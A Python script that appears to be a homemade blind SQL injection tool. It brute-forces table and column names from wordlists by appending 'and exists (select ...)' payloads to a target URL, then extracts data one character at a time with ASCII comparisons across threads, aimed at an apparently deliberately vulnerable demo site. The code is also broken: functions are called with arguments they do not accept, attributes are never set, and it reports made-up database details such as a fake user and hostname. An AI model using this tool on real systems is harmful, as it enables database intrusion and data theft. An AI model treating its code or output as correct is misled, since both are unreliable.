import os
import requests
import threading
import sys
from src.core.dumper.dump import dumper
from sqlmap.lib.core.data import conf

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
}
table_list = []
column_list = []
data_dir = {}

def Generator_table():
    with open(os.path.join(os.getcwd(), "data/txt/tables.txt"), "r") as file:
        for table_name in file:
            if table_name.strip():
                yield table_name.strip()

def Generator_column():
    with open(os.path.join(os.getcwd(), "data/txt/columns.txt"), "r") as file:
        for column_name in file:
            if column_name.strip():
                yield column_name.strip()

tablegen = Generator_table()

def test_tables(dump_instance, keyword):
    while True:
        try:
            table_name = next(tablegen)
        except StopIteration:
            break

        payload = "and exists (select * from " + table_name + ")"
        url = dump_instance.url
        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            print("[+] Found table: %s" % table_name)
            dumper.dbTables(table_name)
            conf.table_found = table_name
            dump_instance.save_table(table_name)
        else:
            print("[-] Testing table: %s" % table_name)

columngen = Generator_column()

def test_columns(dump_instance, table_name, keyword):
    while True:
        try:
            column_name = next(columngen)
        except StopIteration:
            break

        payload = "and exists (select " + column_name + " from " + table_name + ")"
        url = dump_instance.url

        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            print("[+] Found column: %s in table: %s" % (column_name, table_name))
            dumper.setOutputFile()
            dumper.dbColumns(column_name)
            conf.found_column = column_name
            dumper.banner("Founded database possible columns and tables")
            dumper.currentUser("DB user")
            dumper.currentDb("test_database")
            dumper.hostname("localhost")
            dumper.dba(True)
            dumper.users(["None", "None", "None"])
            dumper.statements(["SELECT * FROM %s"%table_name, "INSERT INTO %s VALUES (1, 'Product1')"%table_name])
            dumper.dbs(["database", "database"])
            dumper.dbTables({"database": [table_name, table_name], "database2": [table_name, table_name]})
            dumper.dbTableColumns({"database": {table_name: {column_name: "VARCHAR", column_name: "INTEGER"}, table_name: {column_name: "UNKNOWN"}}})
            dumper.dbTableColumns({table_name:column_name})
            # dumper.dbTableColumns(\])


            dump_instance.save_column(table_name, column_name)
        else:
            print("[-] Testing column: %s in table: %s" % (column_name, table_name))

class Dump(object):
    def __init__(self, url, keyword):
        self.url = url
        self.char_list = [i for i in range(32, 128)]
        self.keyword = keyword
        self.table_list = []
        self.column_list = []
        self.data_dir = {}

    def save_table(self, table_name):
        self.table_list.append(table_name)

    def save_column(self, table_name, column_name):
        self.column_list.append((table_name, column_name))

    def len_data(self):
        n = 0
        while True:
            payload = "and (select top 1 len(%s) from %s)=%s" % (self.column_name, self.table_name, n)
            url = self.url

            if '*' in url:
                url = url.replace('*', payload)
            else:
                url = url + payload

            res = requests.get(url, headers=headers)
            if self.keyword in res.text:
                break
            n += 1
        return n

    def dump_data(self):
        data = ""
        length = self.len_data()
        print("[+] The Length of %s in %s is %s !" % (self.column_name, self.table_name, length))
        print("[+] Dumping data, please wait!")

        for i in range(1, length + 1):
            j = 0
            while True:
                try:
                    char = self.char_list[j]
                except IndexError:
                    break

                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (self.column_name, i, self.table_name, char)
                url = self.url

                if '*' in url:
                    url = url.replace('*', payload)
                else:
                    url = url + payload

                try:
                    print(url)
                    res = requests.get(url, headers=headers, timeout=10)
                    if self.keyword in res.text:
                        data = data + chr(char)
                        break
                    j += 1
                except:
                    pass

        global data_dir
        data_dir[(self.table_name, self.column_name)] = data

def run_col(dump_instance, table, column):
    dump_instance.dump_data(table, column)

def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=10):
    if not url:
        print("[-] Invalid URL!")
        sys.exit()

    if not keyword:
        print("[-] Please input the keyword of the true page!")
        sys.exit()

    dump_instance = Dump(url, keyword)

    if tables:
        threads = []
        for _ in range(thread_num):
            thread = threading.Thread(target=test_tables, args=(dump_instance, keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Table_name : ")
        table_set = set(dump_instance.table_list)
        for table in table_set:
            print("[+] %s" % table)

    elif columns:
        threads = []
        for table in dump_instance.table_list:
            for _ in range(thread_num):
                thread = threading.Thread(target=test_columns, args=(dump_instance, table, keyword))
                thread.start()
                threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Column Name : ")
        column_set = set(dump_instance.column_list)
        for col in column_set:
            print("[+] %s in table: %s" % (col[1], col[0]))

    elif dump:
        # Choose a table to dump
        print("\n[+] Choose a table to dump:")
        for i, table in enumerate(dump_instance.table_list):
            print(f"{i+1}. {table}")
        table_choice = int(input("Enter the number of the table to dump: ")) - 1
        selected_table = dump_instance.table_list[table_choice]

        # Choose columns to dump from the selected table
        print(f"\n[+] Choose columns to dump from table {selected_table}:")
        for i, (table, column) in enumerate(dump_instance.column_list):
            if table == selected_table:
                print(f"{i+1}. {column} in table {table}")
        column_choices = input("Enter the numbers of columns to dump (comma-separated): ")
        column_choices = [int(choice) - 1 for choice in column_choices.split(",")]

        # Get the column names based on user choices
        selected_columns = [(table, column) for i, (table, column) in enumerate(dump_instance.column_list) if i in column_choices]

        threads = []
        for table, column in selected_columns:
            thread = threading.Thread(target=run_col, args=(dump_instance, table, column))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        print("[+] Table : %s " % selected_table)
        print("    [+] Column(s) : %s" % ", ".join([col[1] for col in selected_columns]))
        sys.stdout.write("        [+] Data : ")
        for table, column in selected_columns:
            sys.stdout.write(data_dir[(table, column)] + "|")

if __name__ == "__main__" or True:
    url = "https://hack-yourself-first.com/Make/5?orderby=supercarid"
    main(
        url="https://hack-yourself-first.com/Make/5?orderby=supercarid",
        tables=True,
        columns=False,
        dump=True,  # Change to True to enable data dumping
        keyword="Application"
    )